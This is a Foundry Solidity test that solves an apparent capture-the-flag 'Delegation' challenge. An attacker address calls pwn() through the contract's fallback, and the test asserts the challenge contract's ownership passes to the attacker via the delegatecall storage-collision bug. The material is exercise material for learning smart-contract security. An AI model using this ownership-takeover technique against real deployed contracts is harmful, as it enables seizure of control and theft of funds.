// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

import {Test} from "@forge-std/Test.sol";
import {DeployDelegationScript} from "@script/6_DeployDelegation.s.sol";

import {Delegate, Delegation} from "@main/6_Delegation.sol";


contract DelegationTest is Test, DeployDelegationScript {

    string mnemonic ="test test test test test test test test test test test junk";
    uint256 deployerPrivateKey = vm.deriveKey(mnemonic, "m/44'/60'/0'/0/", 1); //  address = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8

    address deployer = vm.addr(deployerPrivateKey);

    address public attacker = address(11);

    function setUp() public {
        vm.label(deployer, "Deployer");
        vm.label(attacker, "Attacker");

        vm.deal(deployer, 1 ether);
        
        DeployDelegationScript.run();
    }

    function test_isSolved() public {
        vm.startPrank(attacker);

        assertEq(delegateChallenge.owner(), deployer);
        assertEq(delegate.owner(), address(0));

        (bool success, ) = address(delegateChallenge).call(abi.encodeWithSignature("pwn()"));
        require(success, "call not successful");

        assertEq(delegateChallenge.owner(), attacker);
        assertEq(delegate.owner(), address(0));
       
        vm.stopPrank(  );
    }

}